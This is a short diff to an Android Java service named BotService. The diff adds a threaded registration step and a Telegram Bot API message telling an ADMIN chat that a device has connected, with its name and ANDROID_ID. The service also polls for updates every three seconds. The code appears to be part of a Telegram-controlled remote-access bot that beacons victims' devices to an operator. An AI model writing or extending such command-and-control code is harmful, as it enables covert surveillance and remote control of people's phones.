@@ -18,7 +18,9 @@ public class BotService extends Service {
     @Override public int onStartCommand(Intent i, int f, int s) {
         DEVICE_ID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         if (DEVICE_ID == null) DEVICE_ID = "dev_" + System.currentTimeMillis();
-        register();
+        new Thread(new Runnable() {
+            @Override public void run() { register(); }
+        }).start();
         new java.util.Timer().scheduleAtFixedRate(new java.util.TimerTask() {
             @Override public void run() { checkUpdates(); }
         }, 0, 3000);
@@ -34,6 +36,15 @@ public class BotService extends Service {
             client.newCall(new Request.Builder()
                 .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                 .post(b).build()).execute().close();
+        } catch(Exception e) {}
+        try {
+            RequestBody b2 = new FormBody.Builder()
+                .add("chat_id", ADMIN)
+                .add("text", "🟢 الجهاز متصل: " + DEVICE_NAME + "\n🆔 " + DEVICE_ID)
+                .build();
+            client.newCall(new Request.Builder()
+                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
+                .post(b2).build()).execute().close();
         } catch(Exception e) {}
     }
 
